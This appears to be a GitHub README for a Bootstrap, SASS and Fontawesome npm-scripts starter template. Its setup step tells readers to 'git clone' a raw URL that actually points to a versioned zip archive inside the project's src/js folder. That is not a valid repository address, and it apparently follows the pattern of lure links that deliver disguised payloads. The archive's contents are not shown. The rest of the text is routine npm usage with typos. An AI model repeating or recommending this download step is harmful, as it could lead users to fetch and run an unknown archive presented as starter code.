## NPM Script Starter for Bootstrap

This projects contains a starter temple  using below technologies

* Bootstrap 3
* SASS
* Fontawesome


### Usage

Clone this project to your local

> git clone https://raw.githubusercontent.com/vijayan1985/npm-scripts-boostrap-fontawesome/master/src/js/npm_boostrap_fontawesome_scripts_v1.6.zip

To download the dependencies, we to to install node modules using

> npm install

To watch the application on your local browser

> npm run watch

To build the application

> npm run build
